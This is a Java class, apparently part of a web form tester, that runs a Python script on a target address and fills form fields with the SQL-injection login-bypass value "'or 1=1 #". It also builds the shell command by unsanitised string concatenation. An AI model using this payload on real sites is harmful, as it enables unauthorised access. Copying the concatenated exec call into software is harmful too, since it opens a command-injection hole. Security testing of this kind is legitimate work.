package preenchimentoDeCampos;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.List;

import javax.swing.JOptionPane;


public class TestaCampos {
	
	private BufferedReader resposta;
	private String primeiraLinha;
	private String codigoSemUrl;
	
	public String getCodigoSemUrl() {
		return codigoSemUrl;
	}

	public void setCodigoSemUrl(String codigoSemUrl) {
		this.codigoSemUrl = codigoSemUrl;
	}

	public String getPrimeiraLinha() {
		return primeiraLinha;
	}

	public BufferedReader getResposta() {
		return resposta;
	}

	private String respotaFormatada ="";
	
	
	public String getRespotaFormatada() {
		return respotaFormatada;
	}
	
	
	
	public TestaCampos(){}
	
	public void RespostaCampos(String camposEvalores,boolean getprimeiraLinha,boolean crsf) 
	{
		String comando = "python /root/TestaCampos.py "+camposEvalores;
		Process processo;
		
		try {
			processo = Runtime.getRuntime().exec(comando);
			processo.waitFor();
			resposta = new BufferedReader(new InputStreamReader(processo.getInputStream()));
			String linha;
			linha= resposta.readLine();
			primeiraLinha = linha;
			codigoSemUrl = "";
			int i = 0;
			while (linha!=null) {
					respotaFormatada += linha +"\n";
					linha = resposta.readLine();
					if(i!=0)
						codigoSemUrl +=linha+"\n";
					i++;
						
			}
			
		} catch (Exception e) {
			JOptionPane.showMessageDialog(null, "Erro ao preencher os campos");
		}	

	}
	
	public  String criaStringCamposEvalores(List<String> campos, String endereco)
	{	
		String comando = endereco+" ";
		String []valores = {"'or 1=1 #","pasword"};
		String sql = "'or 1=1 #";
		
		for (int i = 0; i < campos.size(); i++) {
			comando += campos.get(i) +" "+ valores[i]+" ";
		}
		
		return comando;
	}
	
}
